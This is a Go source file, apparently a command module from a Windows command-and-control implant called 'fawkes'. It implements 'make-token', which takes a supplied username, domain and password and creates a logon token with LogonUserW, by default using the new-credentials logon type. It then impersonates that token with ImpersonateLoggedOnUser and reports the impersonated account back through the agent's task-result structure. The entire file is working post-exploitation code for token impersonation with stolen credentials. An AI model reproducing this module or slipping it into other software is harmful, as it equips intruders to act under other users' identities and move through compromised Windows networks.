//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	procLogonUserW = advapi32.NewProc("LogonUserW")
)

const (
	LOGON32_LOGON_INTERACTIVE     = 2
	LOGON32_LOGON_NEW_CREDENTIALS = 9
	LOGON32_PROVIDER_DEFAULT      = 0
	LOGON32_PROVIDER_WINNT50      = 3
)

type MakeTokenCommand struct{}

func (c *MakeTokenCommand) Name() string {
	return "make-token"
}

func (c *MakeTokenCommand) Description() string {
	return "Create a token from credentials and impersonate it"
}

type MakeTokenParams struct {
	Username  string `json:"username"`
	Domain    string `json:"domain"`
	Password  string `json:"password"`
	LogonType int    `json:"logon_type"` // Optional, defaults to LOGON32_LOGON_NEW_CREDENTIALS
}

func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
	var params MakeTokenParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate parameters
	if params.Username == "" {
		return structs.CommandResult{
			Output:    "Username is required",
			Status:    "error",
			Completed: true,
		}
	}
	if params.Domain == "" {
		params.Domain = "."
	}
	if params.Password == "" {
		return structs.CommandResult{
			Output:    "Password is required",
			Status:    "error",
			Completed: true,
		}
	}

	// Default to LOGON32_LOGON_NEW_CREDENTIALS if not specified (like xenon)
	if params.LogonType == 0 {
		params.LogonType = LOGON32_LOGON_NEW_CREDENTIALS
	}

	// Revert any existing token first (like xenon's IdentityAgentRevertToken)
	if gIdentityToken != 0 {
		gIdentityToken.Close()
		gIdentityToken = 0
	}
	windows.RevertToSelf()

	// Convert strings to UTF-16
	usernamePtr, err := windows.UTF16PtrFromString(params.Username)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to convert username: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	domainPtr, err := windows.UTF16PtrFromString(params.Domain)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to convert domain: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	passwordPtr, err := windows.UTF16PtrFromString(params.Password)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to convert password: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Determine provider based on logon type
	provider := LOGON32_PROVIDER_DEFAULT
	if params.LogonType == LOGON32_LOGON_NEW_CREDENTIALS {
		provider = LOGON32_PROVIDER_WINNT50
	}

	// Call LogonUserW to create token (xenon stores directly into gIdentityToken)
	ret, _, err := procLogonUserW.Call(
		uintptr(unsafe.Pointer(usernamePtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passwordPtr)),
		uintptr(params.LogonType),
		uintptr(provider),
		uintptr(unsafe.Pointer(&gIdentityToken)),
	)

	if ret == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("LogonUserW failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Impersonate using the token from LogonUserW (stored in gIdentityToken)
	ret, _, _ = procImpersonateLoggedOnUser.Call(uintptr(gIdentityToken))
	if ret == 0 {
		lastErr := windows.GetLastError()
		gIdentityToken.Close()
		gIdentityToken = 0
		return structs.CommandResult{
			Output:    fmt.Sprintf("ImpersonateLoggedOnUser failed (error: 0x%x)", lastErr),
			Status:    "error",
			Completed: true,
		}
	}

	// Get the new identity for confirmation
	var accountName string
	threadTokenUser, err := gIdentityToken.GetTokenUser()
	if err == nil {
		username, domain, _, err := threadTokenUser.User.Sid.LookupAccount("")
		if err == nil {
			accountName = fmt.Sprintf("%s\\%s", domain, username)
		} else {
			accountName = "Successfully impersonated (SID lookup failed)"
		}
	} else {
		accountName = "Successfully impersonated (GetTokenUser failed)"
	}

	return structs.CommandResult{
		Output:    accountName,
		Status:    "success",
		Completed: true,
	}
}
